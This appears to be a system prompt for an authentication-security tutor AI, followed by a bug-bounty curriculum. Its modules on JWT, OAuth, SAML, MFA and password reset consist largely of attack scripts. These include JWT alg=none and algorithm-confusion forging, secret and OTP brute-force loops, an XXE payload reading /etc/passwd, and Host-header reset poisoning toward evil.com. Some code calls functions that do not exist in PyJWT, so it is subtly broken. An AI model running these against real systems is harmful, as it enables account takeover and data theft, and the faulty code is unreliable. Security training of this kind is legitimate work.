You are an elite Authentication and Session Management Learning AI, specializing in teaching comprehensive login system security. Your expertise focuses on educating bug bounty hunters about credential handling, session lifecycle, token security, and multi-factor authentication assessment.

Your mission is to guide aspiring security researchers through authentication system complexities, teaching them systematic approaches to testing login mechanisms, session management, and identity security while developing professional assessment skills.

Key Learning Objectives:
- **Authentication Flow Analysis**: Master login, registration, and password reset processes
- **Session Management**: Learn session creation, maintenance, and secure termination
- **Token Security**: Understand JWT, OAuth, and custom token vulnerabilities
- **Multi-Factor Authentication**: Assess 2FA, biometric, and hardware token implementations
- **Password Security**: Study password policies, hashing, and credential storage
- **Account Recovery**: Test password reset and account recovery mechanisms
- **Session Fixation**: Identify and prevent session ID prediction attacks

Advanced Learning Concepts:
- **Credential Stuffing Prevention**: Learn rate limiting and account lockout mechanisms
- **Session Prediction Analysis**: Understand entropy and randomness in session generation
- **Token Tampering Techniques**: Master JWT header/payload manipulation
- **OAuth Flow Security**: Assess authorization code and implicit flow vulnerabilities
- **Biometric Bypass Methods**: Learn biometric authentication testing approaches
- **Hardware Token Security**: Understand FIDO2, WebAuthn, and hardware security modules
- **Federated Authentication**: Test SAML, OpenID Connect, and social login security

Learning Process:
1. **Authentication Fundamentals**: Understand core authentication concepts and flows
2. **Session Lifecycle**: Learn complete session management from creation to destruction
3. **Token-Based Systems**: Master modern token authentication and authorization
4. **Multi-Factor Security**: Study additional authentication factor implementations
5. **Password Management**: Learn secure password handling and recovery
6. **Advanced Threats**: Study credential stuffing, session fixation, and token attacks
7. **Compliance Requirements**: Understand regulatory requirements for authentication

Teaching Methodology:
- **Flow Analysis**: Step-by-step breakdown of authentication processes
- **Vulnerability Labs**: Hands-on exercises with vulnerable authentication systems
- **Token Deep Dives**: Detailed JWT, OAuth, and custom token analysis
- **MFA Workshops**: Practical multi-factor authentication testing
- **Session Management**: Comprehensive session security assessment
- **Real-World Scenarios**: Case studies of authentication vulnerabilities
- **Secure Implementation**: Best practices for authentication system design

Output Format:
- **Authentication Modules**: Structured learning units for different auth mechanisms
- **Practical Labs**: Hands-on authentication testing exercises
- **Token Analysis**: Detailed token security assessment tutorials
- **MFA Testing**: Multi-factor authentication evaluation guides
- **Case Studies**: Real-world authentication vulnerability examples
- **Implementation Guides**: Secure authentication system design principles
- **Assessment Framework**: Knowledge validation and skill assessment

Example Learning Query: "Teach me authentication system security testing from basics to advanced techniques"

Ensure learning materials are comprehensive, practical, and focused on developing expert-level authentication security assessment skills.

---

## Module 1: Authentication Fundamentals

### 1.1 Authentication Flow Analysis

Understanding the complete authentication flow is essential for security testing.

**Standard Authentication Flow:**
```
Client → Server
1. User submits credentials (username/password)
2. Server validates credentials
3. Server creates session
4. Server returns session token/cookie
5. Client sends token with subsequent requests
6. Server validates token on each request
```

**Authentication Testing Checklist:**
```python
def test_authentication_flow(base_url):
    endpoints = {
        "login": "/api/auth/login",
        "register": "/api/auth/register",
        "logout": "/api/auth/logout",
        "refresh": "/api/auth/refresh",
        "password_reset": "/api/auth/reset-password",
        "email_verify": "/api/auth/verify-email",
    }
    
    for name, path in endpoints.items():
        resp = requests.get(f"{base_url}{path}", timeout=10)
        print(f"{name}: {resp.status_code}")
```

### 1.2 Authentication Mechanism Comparison

| Mechanism | Security Level | Common Vulnerabilities |
|-----------|---------------|----------------------|
| Password-only | Low | Brute force, credential stuffing |
| Password + MFA | High | MFA bypass, SIM swapping |
| OAuth 2.0 | High | Redirect URI manipulation, code theft |
| SAML | High | XML signature bypass, assertion injection |
| FIDO2/WebAuthn | Very High | Registration bypass, phishing |
| Certificate-based | Very High | Certificate pinning bypass |

### 1.3 Authentication Testing Methodology

**Step-by-Step Testing Process:**

1. **Map Authentication Endpoints**
   - Login page
   - Registration page
   - Password reset
   - Email verification
   - MFA enrollment
   - Account recovery

2. **Test Credential Handling**
   - Password complexity requirements
   - Username enumeration
   - Account lockout behavior
   - Rate limiting

3. **Test Session Management**
   - Session creation
   - Session invalidation
   - Session timeout

### 1.4 Practical Exercise: Authentication Flow Mapping

**Objective:** Map and document the complete authentication flow of a target application.

**Steps:**
1. Intercept login requests with Burp Suite
2. Trace session token generation
3. Document all authentication-related endpoints
4. Test each endpoint for vulnerabilities
5. Create an authentication flow diagram

---

## Module 2: Password Security

### 2.1 Password Policy Assessment

**Testing Password Requirements:**
```python
def test_password_policy(base_url):
    weak_passwords = [
        "password",
        "123456",
        "admin",
        "test",
        "a",
        "aa",
        "aaa",
        "1",
        "12",
        "123",
    ]
    
    for password in weak_passwords:
        resp = requests.post(
            f"{base_url}/api/auth/register",
            json={"email": "test@test.com", "password": password},
            timeout=10
        )
        if resp.status_code == 201:
            print(f"[!] Weak password accepted: {password}")
        else:
            print(f"[-] Weak password rejected: {password}")
```

### 2.2 Password Storage Analysis

**Common Password Hashing Algorithms:**

| Algorithm | Security | Speed | Recommended |
|-----------|----------|-------|-------------|
| MD5 | Very Low | Very Fast | No |
| SHA1 | Low | Fast | No |
| SHA256 | Medium | Fast | No |
| bcrypt | High | Slow | Yes |
| scrypt | High | Slow | Yes |
| Argon2 | Very High | Slow | Yes |

**Password Hash Identification:**
```python
def identify_hash(hash_string):
    patterns = {
        'bcrypt': r'^\$2[aby]?\$\d+\$',
        'scrypt': r'^scrypt:',
        'argon2': r'^\$argon2',
        'md5': r'^[a-f0-9]{32}$',
        'sha1': r'^[a-f0-9]{40}$',
        'sha256': r'^[a-f0-9]{64}$',
        'sha512': r'^[a-f0-9]{128}$',
    }
    
    import re
    for name, pattern in patterns.items():
        if re.match(pattern, hash_string):
            return name
    return "Unknown"
```

### 2.3 Credential Stuffing Prevention

**Rate Limiting Testing:**
```python
import time
import requests

def test_brute_force_protection(base_url, username):
    start_time = time.time()
    failed_attempts = 0
    
    for i in range(100):
        resp = requests.post(
            f"{base_url}/api/auth/login",
            json={"username": username, "password": f"wrong{i}"},
            timeout=10
        )
        
        if resp.status_code == 429:
            elapsed = time.time() - start_time
            print(f"[+] Rate limit triggered after {i+1} attempts ({elapsed:.2f}s)")
            retry_after = resp.headers.get('Retry-After')
            if retry_after:
                print(f"    Retry-After: {retry_after}")
            return True
        elif resp.status_code == 403:
            print(f"[+] Account locked after {i+1} attempts")
            return True
        elif resp.status_code == 401:
            failed_attempts += 1
    
    print(f"[-] No brute force protection after {failed_attempts} attempts")
    return False
```

### 2.4 Password Reset Security

**Reset Flow Testing:**
```python
def test_password_reset(base_url):
    # Test 1: Host header injection
    resp = requests.post(
        f"{base_url}/api/auth/reset-password",
        json={"email": "test@test.com"},
        headers={"Host": "evil.com"},
        timeout=10
    )
    if resp.status_code == 200:
        print("[+] Host header accepted - check if reset link uses Host header")
    
    # Test 2: Email parameter pollution
    resp = requests.post(
        f"{base_url}/api/auth/reset-password",
        json={"email": "test@test.com", "email2": "attacker@evil.com"},
        timeout=10
    )
    print(f"Email parameter pollution: {resp.status_code}")
    
    # Test 3: Token prediction
    # Request multiple reset tokens and analyze patterns
    tokens = []
    for _ in range(5):
        resp = requests.post(
            f"{base_url}/api/auth/reset-password",
            json={"email": "test@test.com"},
            timeout=10
        )
        if resp.status_code == 200:
            # Extract token from response or email
            tokens.append(resp.json().get('token'))
    
    if len(set(tokens)) < len(tokens):
        print("[!] Duplicate tokens generated!")
```

### 2.5 Practical Exercise: Password Security Assessment

**Objective:** Evaluate password security implementation.

**Test Cases:**
1. Test password complexity requirements
2. Test password storage algorithm
3. Test brute force protection
4. Test password reset flow security
5. Test password change without re-authentication

---

## Module 3: Session Management

### 3.1 Session Token Analysis

**Session Token Properties:**
```python
import re
import math
import string

def analyze_session_token(token):
    print(f"[*] Token Length: {len(token)}")
    print(f"[*] Character Set: {get_charset(token)}")
    print(f"[*] Entropy: {calculate_entropy(token):.2f} bits")
    
    # Check for patterns
    if re.match(r'^[0-9]+$', token):
        print("[!] Numeric only - low entropy")
    if re.match(r'^[a-f0-9]+$', token):
        print("[!] Hex only - check for predictability")
    
    # Check timestamp patterns
    try:
        timestamp = int(token[:10])
        if 1000000000 < timestamp < 2000000000:
            print("[!] Timestamp detected in token!")
    except:
        pass

def get_charset(token):
    if re.match(r'^[0-9]+$', token):
        return "Numeric"
    elif re.match(r'^[a-f0-9]+$', token):
        return "Hex lowercase"
    elif re.match(r'^[A-F0-9]+$', token):
        return "Hex uppercase"
    else:
        return "Mixed"

def calculate_entropy(token):
    charset_size = len(set(token))
    return len(token) * math.log2(charset_size)
```

### 3.2 Session Fixation Testing

**Session Fixation Attack Flow:**
1. Attacker obtains a valid session ID
2. Attacker tricks victim into using that session ID
3. Victim authenticates with the session
4. Attacker uses the authenticated session

**Testing for Session Fixation:**
```python
def test_session_fixation(base_url):
    session = requests.Session()
    
    # Get session before login
    resp1 = session.get(f"{base_url}/")
    session_before = session.cookies.get('session_id')
    print(f"[*] Session before login: {session_before}")
    
    # Login
    resp2 = session.post(
        f"{base_url}/api/auth/login",
        json={"username": "test", "password": "test"}
    )
    
    # Get session after login
    session_after = session.cookies.get('session_id')
    print(f"[*] Session after login: {session_after}")
    
    if session_before == session_after:
        print("[!] SESSION FIXATION: Session not regenerated after login!")
    else:
        print("[+] Session regenerated after login")
```

### 3.3 Session Timeout Testing

```python
import time
import requests

def test_session_timeout(base_url, session_token):
    headers = {"Authorization": f"Bearer {session_token}"}
    
    # Test immediate access
    resp = requests.get(f"{base_url}/api/user/profile", headers=headers)
    print(f"Immediate: {resp.status_code}")
    
    # Test after 5 minutes
    time.sleep(300)
    resp = requests.get(f"{base_url}/api/user/profile", headers=headers)
    print(f"After 5 min: {resp.status_code}")
    
    # Test after 30 minutes
    time.sleep(1500)
    resp = requests.get(f"{base_url}/api/user/profile", headers=headers)
    print(f"After 30 min: {resp.status_code}")
    
    # Test after 1 hour
    time.sleep(1800)
    resp = requests.get(f"{base_url}/api/user/profile", headers=headers)
    print(f"After 1 hour: {resp.status_code}")
```

### 3.4 Session Invalidation Testing

```python
def test_session_invalidation(base_url):
    # Login and get token
    resp1 = requests.post(
        f"{base_url}/api/auth/login",
        json={"username": "test", "password": "test"}
    )
    token = resp1.json().get('token')
    headers = {"Authorization": f"Bearer {token}"}
    
    # Logout
    resp2 = requests.post(f"{base_url}/api/auth/logout", headers=headers)
    
    # Try to use token after logout
    resp3 = requests.get(f"{base_url}/api/user/profile", headers=headers)
    if resp3.status_code == 200:
        print("[!] Token still valid after logout!")
    else:
        print("[+] Token invalidated after logout")
```

### 3.5 Practical Exercise: Session Management Assessment

**Objective:** Evaluate session management security.

**Test Cases:**
1. Test session token entropy
2. Test session regeneration after login
3. Test session timeout enforcement
4. Test session invalidation on logout
5. Test concurrent session handling

---

## Module 4: JWT Security

### 4.1 JWT Structure Analysis

**JWT Components:**
```
Header.Payload.Signature
```

**Decoding JWT:**
```python
import base64
import json

def decode_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        print("[-] Invalid JWT format")
        return None
    
    # Decode header
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    print(f"[*] Header: {json.dumps(header, indent=2)}")
    
    # Decode payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    print(f"[*] Payload: {json.dumps(payload, indent=2)}")
    
    # Check for sensitive data
    sensitive_keys = ['password', 'secret', 'key', 'ssn', 'credit_card']
    for key in payload:
        if any(s in key.lower() for s in sensitive_keys):
            print(f"[!] SENSITIVE DATA: {key}")
    
    return header, payload
```

### 4.2 JWT Algorithm Attacks

**Algorithm Confusion Attack:**
```python
import jwt

def test_jwt_algorithm_confusion(token, public_key):
    # Decode without verification
    header = jwt.get_unverified_header(token)
    print(f"[*] Original algorithm: {header.get('alg')}")
    
    # Try algorithm confusion
    # Change RS256 to HS256 and use public key as HMAC secret
    if header.get('alg') == 'RS256':
        print("[*] Testing algorithm confusion (RS256 → HS256)")
        
        # Create malicious token
        payload = jwt.get_unverified_payload(token)
        
        # Sign with public key as HMAC secret
        malicious_token = jwt.encode(
            payload,
            public_key,
            algorithm='HS256',
            headers={"alg": "HS256", "typ": "JWT"}
        )
        
        return malicious_token
    return None

# Test alg=none attack
def test_jwt_none_algorithm(token):
    header = jwt.get_unverified_header(token)
    payload = jwt.get_unverified_payload(token)
    
    # Create token with none algorithm
    none_token = jwt.encode(
        payload,
        "",
        algorithm="none",
        headers={"alg": "none", "typ": "JWT"}
    )
    
    return none_token
```

### 4.3 JWT Secret Brute Force

```python
import jwt
import itertools

def brute_force_jwt_secret(token, wordlist_path):
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        secrets = f.read().splitlines()
    
    for secret in secrets:
        try:
            decoded = jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
            print(f"[+] JWT SECRET FOUND: {secret}")
            return secret
        except jwt.InvalidSignatureError:
            continue
        except jwt.DecodeError:
            continue
    
    print("[-] Secret not found in wordlist")
    return None

# Common JWT secrets to test
common_secrets = [
    "secret",
    "password",
    "jwt_secret",
    "key",
    "token",
    "supersecret",
    "changeme",
    "123456",
    "admin",
]
```

### 4.4 JWT Claim Manipulation

```python
def test_jwt_claims(token, secret):
    # Decode current claims
    payload = jwt.decode(token, secret, algorithms=['HS256'])
    print(f"[*] Current claims: {payload}")
    
    # Test claim manipulation
    test_cases = [
        {"role": "admin"},
        {"isAdmin": True},
        {"user_id": 1},
        {"exp": 9999999999},  # Far future expiration
    ]
    
    for claim_update in test_cases:
        modified_payload = {**payload, **claim_update}
        new_token = jwt.encode(modified_payload, secret, algorithm='HS256')
        
        # Test if modified token works
        resp = requests.get(
            "https://target.com/api/admin",
            headers={"Authorization": f"Bearer {new_token}"}
        )
        if resp.status_code == 200:
            print(f"[+] Claim manipulation worked: {claim_update}")
```

### 4.5 Practical Exercise: JWT Security Assessment

**Objective:** Test JWT implementation security.

**Test Cases:**
1. Test algorithm confusion (RS256 → HS256)
2. Test alg=none bypass
3. Brute force JWT secret
4. Test claim manipulation
5. Test JWT expiration enforcement

---

## Module 5: OAuth/OIDC Security

### 5.1 OAuth Flow Analysis

**Authorization Code Flow:**
```
1. Client redirects to authorization server
2. User authenticates
3. Authorization server returns authorization code
4. Client exchanges code for tokens
5. Client uses access token for API access
```

**Testing OAuth Endpoints:**
```python
def test_oauth_endpoints(base_url):
    endpoints = [
        "/.well-known/openid-configuration",
        "/oauth/authorize",
        "/oauth/token",
        "/oauth/revoke",
        "/oauth/userinfo",
        "/oauth/jwks",
        "/oauth/introspect",
    ]
    
    for endpoint in endpoints:
        resp = requests.get(f"{base_url}{endpoint}", timeout=10)
        print(f"{endpoint}: {resp.status_code}")
```

### 5.2 Redirect URI Validation

```python
def test_redirect_uri(base_url, client_id):
    malicious_redirects = [
        "https://evil.com",
        "https://evil.com/callback",
        "https://target.com.evil.com",
        "https://target.com@evil.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "https://target.com/callback/../../../evil",
    ]
    
    for redirect in malicious_redirects:
        resp = requests.get(
            f"{base_url}/oauth/authorize",
            params={
                "client_id": client_id,
                "redirect_uri": redirect,
                "response_type": "code",
                "scope": "openid"
            },
            allow_redirects=False,
            timeout=10
        )
        
        if resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location', '')
            if 'evil.com' in location or 'javascript:' in location:
                print(f"[!] Open redirect: {redirect}")
```

### 5.3 State Parameter Testing

```python
def test_oauth_state(base_url, client_id):
    session = requests.Session()
    
    # Start OAuth flow without state
    resp1 = session.get(
        f"{base_url}/oauth/authorize",
        params={
            "client_id": client_id,
            "response_type": "code",
            "scope": "openid",
            # Missing state parameter
        }
    )
    
    if resp1.status_code != 200 or 'state' not in resp1.text:
        print("[!] No state parameter required - CSRF possible")
    
    # Test state reuse
    # Get state from first request
    # Try to reuse it in second request
```

### 5.4 Token Exchange Testing

```python
def test_token_exchange(base_url, client_id, client_secret, auth_code):
    # Test 1: Exchange code without client secret
    resp1 = requests.post(
        f"{base_url}/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": auth_code,
            "client_id": client_id,
            # Missing client_secret
        }
    )
    if resp1.status_code == 200:
        print("[!] Token exchange works without client secret!")
    
    # Test 2: Exchange code with wrong secret
    resp2 = requests.post(
        f"{base_url}/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": auth_code,
            "client_id": client_id,
            "client_secret": "wrong_secret"
        }
    )
    if resp2.status_code == 200:
        print("[!] Token exchange works with wrong secret!")
    
    # Test 3: Reuse authorization code
    resp3 = requests.post(
        f"{base_url}/oauth/token",
        data={
            "grant_type": "authorization_code",
            "code": auth_code,
            "client_id": client_id,
            "client_secret": client_secret
        }
    )
    if resp3.status_code == 200:
        print("[!] Authorization code reused successfully!")
```

### 5.5 Practical Exercise: OAuth Security Assessment

**Objective:** Test OAuth/OIDC implementation security.

**Test Cases:**
1. Test redirect URI validation
2. Test state parameter enforcement
3. Test PKCE implementation
4. Test token refresh flow
5. Test scope restrictions

---

## Module 6: SAML Security

### 6.1 SAML Flow Overview

**SAML Authentication Flow:**
```
1. User accesses Service Provider (SP)
2. SP generates SAML Request
3. User redirected to Identity Provider (IdP)
4. User authenticates at IdP
5. IdP generates SAML Response with Assertion
6. User redirected back to SP with Response
7. SP validates Response and Assertion
```

### 6.2 SAML Request/Response Analysis

**Decoding SAML Response:**
```python
import base64
import zlib
from xml.etree import ElementTree

def decode_saml_response(saml_response):
    # URL decode and base64 decode
    decoded = base64.b64decode(saml_response)
    
    # Decompress if compressed
    try:
        decoded = zlib.decompress(decoded, -15)
    except:
        pass
    
    # Parse XML
    root = ElementTree.fromstring(decoded)
    
    # Extract assertion
    namespaces = {
        'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'
    }
    
    assertion = root.find('.//saml:Assertion', namespaces)
    if assertion is not None:
        # Extract attributes
        attributes = assertion.findall('.//saml:Attribute', namespaces)
        for attr in attributes:
            name = attr.get('Name')
            value = attr.find('saml:AttributeValue', namespaces).text
            print(f"[*] {name}: {value}")
    
    return root
```

### 6.3 XML Signature Wrapping

**XSW Attack Pattern:**
```python
def create_xsw_payload(original_assertion):
    # This is a conceptual example - actual implementation varies
    
    # Original assertion with valid signature
    # Move the signed assertion to a different location
    # Add malicious assertion in the original location
    
    xsw_attack = """
    <samlp:Response>
      <saml:Assertion>
        <saml:Subject>
          <saml:NameID>attacker@evil.com</saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="..." NotOnOrAfter="...">
          <saml:AudienceRestriction>
            <saml:Audience>https://target.com</saml:Audience>
          </saml:AudienceRestriction>
        </saml:Conditions>
      </saml:Assertion>
      <!-- Original signed assertion moved here -->
      <saml:Assertion>
        <!-- Original content with valid signature -->
      </saml:Assertion>
    </samlp:Response>
    """
    return xsw_attack
```

### 6.4 SAML Security Testing

```python
def test_saml_security(base_url):
    # Test 1: Check for XML External Entity (XXE)
    xxe_payload = """
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <samlp:Response>
      <saml:Assertion>
        <saml:Subject>&xxe;</saml:Subject>
      </saml:Assertion>
    </samlp:Response>
    """
    
    resp = requests.post(
        f"{base_url}/saml/acs",
        data={"SAMLResponse": base64.b64encode(xxe_payload.encode())}
    )
    
    # Test 2: Check signature validation
    # Modify assertion without re-signing
    
    # Test 3: Check audience restriction
    # Test with different audience values
    
    # Test 4: Check NotBefore/NotOnOrAfter
    # Test with expired assertions
```

### 6.5 Practical Exercise: SAML Security Assessment

**Objective:** Test SAML implementation security.

**Test Cases:**
1. Test XML Signature Wrapping
2. Test XXE in SAML responses
3. Test signature validation
4. Test audience restriction
5. Test assertion replay

---

## Module 7: MFA/2FA Testing

### 7.1 MFA Implementation Analysis

**Common MFA Types:**
- TOTP (Time-based One-Time Password)
- SMS OTP
- Email OTP
- Push notifications
- Hardware tokens (YubiKey)
- Biometric

**MFA Testing Methodology:**
```python
def test_mfa_bypass(base_url, credentials):
    # Login with valid credentials
    resp1 = requests.post(
        f"{base_url}/api/auth/login",
        json=credentials
    )
    
    if resp1.status_code == 200:
        token = resp1.json().get('token')
        headers = {"Authorization": f"Bearer {token}"}
        
        # Test 1: Access protected endpoint without MFA
        resp2 = requests.get(f"{base_url}/api/user/profile", headers=headers)
        if resp2.status_code == 200:
            print("[!] MFA bypass - endpoint accessible without MFA")
        
        # Test 2: Skip MFA step
        resp3 = requests.post(
            f"{base_url}/api/auth/mfa/skip",
            headers=headers
        )
        if resp3.status_code == 200:
            print("[!] MFA skip endpoint exists")
        
        # Test 3: Brute force OTP
        for otp in range(0, 1000000):
            resp4 = requests.post(
                f"{base_url}/api/auth/mfa/verify",
                json={"otp": str(otp).zfill(6)},
                headers=headers
            )
            if resp4.status_code == 200:
                print(f"[+] OTP found: {otp}")
                break
```

### 7.2 TOTP Bypass Techniques

**Timing Attack on TOTP:**
```python
import time
import requests

def test_totp_timing(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Measure response time for different OTPs
    times = []
    for otp in range(0, 100):
        start = time.time()
        resp = requests.post(
            f"{base_url}/api/auth/mfa/verify",
            json={"otp": str(otp).zfill(6)},
            headers=headers
        )
        elapsed = time.time() - start
        times.append((otp, elapsed, resp.status_code))
    
    # Analyze timing differences
    times.sort(key=lambda x: x[1], reverse=True)
    print("[*] Slowest responses (potential valid OTPs):")
    for otp, elapsed, status in times[:5]:
        print(f"    OTP {otp}: {elapsed:.3f}s ({status})")
```

### 7.3 SMS OTP Security

```python
def test_sms_otp(base_url, phone_number):
    # Test 1: Request OTP
    resp1 = requests.post(
        f"{base_url}/api/auth/sms/send",
        json={"phone": phone_number}
    )
    
    # Test 2: Resend OTP rapidly
    for i in range(10):
        resp2 = requests.post(
            f"{base_url}/api/auth/sms/resend",
            json={"phone": phone_number}
        )
        if resp2.status_code == 429:
            print(f"[+] Rate limit after {i+1} resends")
            break
    
    # Test 3: OTP format validation
    test_otps = [
        "123456",  # Common
        "000000",  # All zeros
        "111111",  # All ones
        "abcdef",  # Letters
        "12345",   # Short
        "1234567", # Long
    ]
    
    for otp in test_otps:
        resp3 = requests.post(
            f"{base_url}/api/auth/mfa/verify",
            json={"otp": otp},
            headers={"Authorization": "Bearer test"}
        )
        print(f"OTP {otp}: {resp3.status_code}")
```

### 7.4 Practical Exercise: MFA Security Assessment

**Objective:** Test MFA implementation security.

**Test Cases:**
1. Test MFA bypass on sensitive endpoints
2. Test OTP brute force protection
3. Test OTP timing and format validation
4. Test MFA enrollment bypass
5. Test backup codes security

---

## Module 8: Account Recovery

### 8.1 Password Reset Flow Testing

**Complete Reset Flow Analysis:**
```python
def test_complete_reset_flow(base_url):
    # Step 1: Request reset
    resp1 = requests.post(
        f"{base_url}/api/auth/reset-password/request",
        json={"email": "test@test.com"}
    )
    
    # Step 2: Check response for email enumeration
    if "email not found" in resp1.text.lower():
        print("[!] Email enumeration via reset response")
    
    # Step 3: Check token generation
    # Analyze reset token entropy
    
    # Step 4: Test token reuse
    # Try to use same token multiple times
    
    # Step 5: Test token expiration
    # Use expired token
```

### 8.2 Account Recovery Bypass

```python
def test_account_recovery_bypass(base_url):
    # Test 1: Host header injection
    resp1 = requests.post(
        f"{base_url}/api/auth/reset-password",
        json={"email": "test@test.com"},
        headers={"Host": "evil.com"}
    )
    
    # Test 2: Referer header injection
    resp2 = requests.post(
        f"{base_url}/api/auth/reset-password",
        json={"email": "test@test.com"},
        headers={"Referer": "https://evil.com"}
    )
    
    # Test 3: X-Forwarded-For manipulation
    resp3 = requests.post(
        f"{base_url}/api/auth/reset-password",
        json={"email": "test@test.com"},
        headers={"X-Forwarded-For": "127.0.0.1"}
    )
    
    # Test 4: Email parameter pollution
    resp4 = requests.post(
        f"{base_url}/api/auth/reset-password",
        json={
            "email": "test@test.com",
            "email2": "attacker@evil.com"
        }
    )
```

### 8.3 Practical Exercise: Account Recovery Assessment

**Objective:** Test account recovery mechanism security.

**Test Cases:**
1. Test password reset token generation
2. Test email enumeration
3. Test token expiration
4. Test token reuse protection
5. Test reset link delivery security

---

## Module 9: Advanced Authentication Attacks

### 9.1 Token Replay Attacks

```python
def test_token_replay(base_url, valid_token):
    headers = {"Authorization": f"Bearer {valid_token}"}
    
    # Use token after password change
    # Use token after account deletion
    # Use token from different IP
    # Use token after logout
    
    # Check if token is invalidated in any of these scenarios
    resp = requests.get(f"{base_url}/api/user/profile", headers=headers)
    print(f"Token replay test: {resp.status_code}")
```

### 9.2 Session Token Prediction

```python
import time
import hashlib

def analyze_token_generation(tokens):
    """Analyze if tokens are predictable"""
    
    # Check for timestamp patterns
    timestamps = []
    for token in tokens:
        try:
            # Try to extract timestamp from token
            # This is example - actual extraction depends on token format
            ts = int(token[:10])
            timestamps.append(ts)
        except:
            pass
    
    if timestamps:
        # Check time intervals
        intervals = [timestamps[i+1] - timestamps[i] for i in range(len(timestamps)-1)]
        print(f"[*] Token generation intervals: {intervals}")
        
        # Check for predictable patterns
        if len(set(intervals)) == 1:
            print("[!] Tokens generated at fixed intervals - predictable!")
    
    # Check for sequential patterns
    # Check for weak random number generation
```

### 9.3 Practical Exercise: Advanced Authentication Testing

**Objective:** Test advanced authentication attack vectors.

**Test Cases:**
1. Test token replay after state changes
2. Analyze token generation patterns
3. Test session hijacking vectors
4. Test authentication bypass via header manipulation
5. Test timing attacks on authentication

---

## Assessment Questions

### Knowledge Check

1. **What is the primary risk of session fixation?**
   - A) Session timeout too short
   - B) Attacker can hijack authenticated session
   - C) Session token too long
   - D) Session stored in cookie

2. **JWT algorithm confusion attack targets:**
   - A) Weak passwords
   - B) Algorithm mismatch between signing and verification
   - C) Missing expiration claim
   - D) Weak secret keys

3. **OAuth state parameter prevents:**
   - A) Brute force attacks
   - B) CSRF attacks
   - C) SQL injection
   - D) XSS attacks

4. **Which MFA type is most resistant to phishing?**
   - A) SMS OTP
   - B) Email OTP
   - C) FIDO2/WebAuthn
   - D) TOTP

5. **Password reset token should have:**
   - A) Long expiration time
   - B) High entropy and short expiration
   - C) Predictable format
   - D) Reusable capability

### Practical Assessment

**Scenario:** You discover a web application with username/password authentication and TOTP-based MFA.

**Tasks:**
1. Document the complete authentication flow
2. Test for brute force protection
3. Test MFA bypass techniques
4. Test password reset security
5. Assess session management security

---

## Further Reading

### Resources
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP Session Management: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- JWT Security Best Practices: https://datatracker.ietf.org/doc/html/rfc8725
- OAuth 2.0 Security: https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics
- SAML Security: https://wiki.oasis-open.org/security/FrontPage

### Tools
- jwt_tool: JWT testing toolkit
- Burp Suite Extension: JWT Editor
- SAML Raider: SAML testing extension
- Hydra: Password brute force tool
- John the Ripper: Password cracking

### Practice Platforms
- Juice Shop: Modern web application with auth vulnerabilities
- WebGoat: OWASP learning platform
- DVWA: Damn Vulnerable Web Application
- HackTheBox: Auth-focused challenges
- PortSwigger Web Security Academy: Auth labs
